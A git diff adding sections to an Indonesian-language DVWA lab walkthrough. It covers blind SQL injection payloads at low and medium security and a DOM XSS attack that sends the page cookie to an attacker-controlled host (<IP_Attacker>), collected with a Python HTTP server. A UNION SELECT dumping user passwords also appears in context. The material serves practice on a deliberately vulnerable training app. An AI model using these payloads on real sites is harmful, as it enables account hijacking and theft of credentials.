@@ -144,4 +144,45 @@ Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
 1' UNION SELECT user, password FROM users#
 ```
 
+## SQL Injection (Blind)
+Blind SQL Injection muncul ketika aplikasi rentan terhadap SQL Injection, tetapi respons HTTP-nya tidak berisi hasil kueri SQL yang relevan atau detail kesalahan basis data apa pun.
+
+### Security Low
+```sh
+1' and length(database())=4#
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2011.JPG)
+
+### Security Medium
+Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
+```sh
+1 and sleep(5)
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2012.JPG)
+
+## XSS (DOM)
+DOM based XSS muncul ketika Javascript mengambil data dari sumber yang dapat dikontrol oleh penyerang misalnya seperti URL, yang memungkinkan penyerang mengeksekusi code JavaScript yang berbahaya dan membajak akun pengguna lain.
+
+### Security Low
+Menampilkan cookie halaman
+```sh
+http://<IP_Machine>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2013.JPG)
+
+Membuat halaman untuk menampung cookie
+```sh
+python3 -m http.server 80
+```
+
+Melakukan pencurian cookie dan kirim ke halaman penampung
+```sh
+http://<IP_Machine>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2014.JPG)
+
 Referensi: https://portswigger.net/web-security/learning-path
